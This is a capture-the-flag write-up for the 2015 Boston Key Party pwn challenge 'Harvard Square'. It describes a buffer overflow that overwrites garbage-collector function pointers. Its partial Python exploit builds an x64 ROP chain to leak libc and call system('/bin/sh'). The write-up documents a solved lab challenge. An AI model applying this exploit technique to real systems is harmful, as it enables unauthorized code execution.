title: Boston Key Party CTF 2015 Pwn 275 Harvard Square 
date: 2015-03-02 1:50
category: pwn
tags: BKPCTF, bof
slug: bkpctf_pwn_275_harvard_square

This problem was worth 275 pts, but I thought it is easier than other red problems. XD  
We could reverse it happily beacuse the programe wasn't stipped.  
* * *

The problem is a game about transcation of 0days.  
We could enter the password and cheated the game, but it's useless. XD  
After executing the binary, the game printed the message:  

>Welcome to 0day Warz - The goal of the game is to get the $100M USD by the end of the game. You have been given a loan of $2000, with some high interest rate of 25% a day!  

The program for the goal of game:  
```
void play_game() {
    ...
    if (owed == 0.0) {
        if (money > 9999999)
      action_hiscore();
    }
  ...
}
void action_hiscore() {
    char buf[268];
  ....
  read(0, buf, 0x400);
  ...
}
```

However, if understood the game rule, we could know the condition is impossible to reach.  
So we must find another vulunerbility.  
In fact, there is a bof when `play_game()` starting.  
It couldn't overflow the return address, but we could use it to change function pointers. :D  

The programe use [simple-gc](https://github.com/dhamidi/simple-gc/).  
It will create two garbage-collectors and put function pointer `exploit_free` and `string_free` to gc.  
Then, gc will trigger when we do `sleep` action.  
We could overwrite function ptr to `action_hiscore`, and we could overwrite the return address.  

We could write the exploit until now.  
Honestly, I am not familar with x64 architecture exploit.  
I wasted a lot of time to debug my code. :(  

By the way, args on x64 is in register.  
```
arg1 => rdi
arg2 => rsi
arg3 => rdx
arg4 => r8
...
```

So we must find some gadget to control arguments at first.  
Then, we could use `put()` to leak arbitrary address.  
There exist a little bug.... stdout dupped to socket.  
We won't receive the content immediately.  
To solve this bug, I returned to `action_hiscore()` again because there is `fflush()` at the end of function.  

After leaked the address, we could calulate the address of `system()`.  
Next, We needed a string of "/bin/sh".  
Luckily, we could find it in libc, too. XD  
So we couldn execute `system("/bin/sh")` to get the shell.  

My partitial exploit:  
```
# leak address
raw_input("wait gdb")
read_until("name? ")
pop_rdi = up64("402fc3")
got = up64("605061")
put = up64("400cd0")
payload = "a"*280 + pop_rdi + got + put + bof
send_line(payload)
read_until("...-'\"\n")
read_until("!\n")

# get leak and count libc
leak = read_line().strip()[::-1].encode("hex")
base = int(leak+"00", 16) - 0x54400
system = hex(base + 0x46640)[2:]
system = up64(system)
binsh = hex(base + 0x17d87b)[2:]

# get and shell out
read_until("name? ")
buf = up64("605800")
payload = "a"*280 + pop_rdi + up64(binsh) + system
send_line(payload)
read_until("!\n")

t.interact()
```

flag: `stay_in_school_and_dont_do_the_grugq`  
